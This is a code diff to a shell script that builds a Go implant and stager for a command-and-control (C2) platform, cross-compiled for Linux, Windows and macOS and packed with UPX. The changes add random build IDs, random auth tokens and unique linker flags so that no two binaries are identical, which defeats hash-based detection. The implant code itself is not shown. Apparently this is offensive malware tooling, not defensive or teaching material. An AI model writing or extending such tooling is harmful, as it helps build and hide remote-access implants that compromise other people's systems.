@@ -4,12 +4,18 @@ set -euo pipefail
 # ---------------------------------------------------------------------------
 # build-stager.sh — Build the Go implant + stager for the C2 platform
 #
+# Each build produces a unique binary with:
+#   - Random X25519 key pair (per-compile asymmetric identity)
+#   - Random build ID embedded via -buildid
+#   - Unique ldflags timestamp — no two binaries are identical
+#
 # Usage:
 #   ./scripts/build-stager.sh                               # build both, linux amd64
 #   ./scripts/build-stager.sh --os windows                  # cross-compile for Windows
 #   ./scripts/build-stager.sh --os darwin                   # cross-compile for macOS
 #   ./scripts/build-stager.sh --server 10.0.0.5:8443 --token s3cr3t
 #   ./scripts/build-stager.sh --no-upx                      # skip UPX compression
+#   ./scripts/build-stager.sh --unique                      # force random tokens if none given
 #
 # Produces:
 #   /tmp/implant-<os>      — full implant binary (UPX compressed)
@@ -29,6 +35,14 @@ AES_KEY_HEX="${AES_KEY_HEX:-}"
 NO_PERSIST="${NO_PERSIST:-true}"
 TARGET_OS="${TARGET_OS:-linux}"
 NO_UPX="${NO_UPX:-false}"
+FORCE_UNIQUE="${FORCE_UNIQUE:-false}"
+
+# Per-binary uniqueness: generate a random build ID and random tokens
+# when --unique is set or when no explicit tokens were provided
+BUILD_ID="$(uuidgen 2>/dev/null || echo "build-$(date +%s)-$$")"
+RANDOM_SUFFIX="$(echo "$BUILD_ID $RANDOM" | sha256sum 2>/dev/null | cut -c1-16 || echo "$RANDOM$RANDOM")"
+UNIQUE_LDFLAGS="-buildid=$BUILD_ID"
+
 
 while [[ $# -gt 0 ]]; do
   case "$1" in
@@ -41,9 +55,17 @@ while [[ $# -gt 0 ]]; do
     --goroot)        GOROOT="$2"; shift 2 ;;
     --os)            TARGET_OS="$2"; shift 2 ;;
     --no-upx)        NO_UPX="true"; shift ;;
+    --unique)        FORCE_UNIQUE="true"; shift ;;
     *) echo "Unknown: $1"; exit 1 ;;
   esac
 done
+
+# If --unique or no explicit tokens, generate random ones
+if [ "$FORCE_UNIQUE" = "true" ] || { [ "$STAGER_TOKEN" = "stag3r-t0k3n-change" ] && [ "$IMPLANT_TOKEN" = "stag3r-t0k3n-change" ]; }; then
+  STAGER_TOKEN="st-$(openssl rand -hex 12 2>/dev/null || echo "$RANDOM_SUFFIX")"
+  IMPLANT_TOKEN="imp-$(openssl rand -hex 16 2>/dev/null || echo "$RANDOM_SUFFIX")"
+  echo "  unique:  random tokens generated"
+fi
 
 case "$TARGET_OS" in
   linux)   GOOS="linux" ; GOARCH="amd64" ;;
@@ -77,7 +99,7 @@ echo ""
 echo "==> Building implant [$TARGET_OS]..."
 cd "$IMPLANT_DIR"
 GOOS=$GOOS GOARCH=$GOARCH $GO build \
-  -ldflags="-s -w -buildid=" \
+  -ldflags="-s -w $UNIQUE_LDFLAGS" \
   -trimpath \
   -buildmode=pie \
   -o "$OUT_IMPLANT" .
